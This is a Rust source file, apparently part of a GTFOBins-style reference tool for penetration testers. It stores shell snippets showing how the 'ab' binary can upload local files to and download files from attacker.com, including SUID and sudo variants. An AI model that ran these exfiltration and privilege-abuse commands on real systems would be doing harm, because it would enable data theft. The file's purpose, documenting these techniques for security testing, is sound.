pub static BIN_NAME: &'static str = "ab";
pub static FU_DESC: &'static str = "Upload local file via HTTP POST request";
static FU_CODE: &'static str = r#"
    
    URL=http://attacker.com/
    LFILE=file_to_send
    ab -p $LFILE $URL
"#;
pub static FD_DESC: &'static str = "Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.";
static FD_CODE: &'static str = r#"
    
    URL=http://attacker.com/file_to_download
    ab -v2 $URL
"#;
pub static SUID_DESC: &'static str = "Upload local file via HTTP POST request.";
static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which ab) .
    URL=http://attacker.com/
    LFILE=file_to_send
    ./ab -p $LFILE $URL
"#;
pub static SUDO_DESC: &'static str = "Upload local file via HTTP POST request.";
static SUDO_CODE: &'static str = r#"
    
    URL=http://attacker.com/
    LFILE=file_to_send
    sudo ab -p $LFILE $URL
"#;

use crate::code::{Code, Tag};
pub static FU: Code = Code {
    title: "FILE_UPLOAD",
    code: FU_CODE,
    tag: Tag::FU,
};
pub static FD: Code = Code {
    title: "FILE_DOWNLOAD",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static SUID: Code = Code {
    title: "SUID",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code = Code {
    title: "SUDO",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
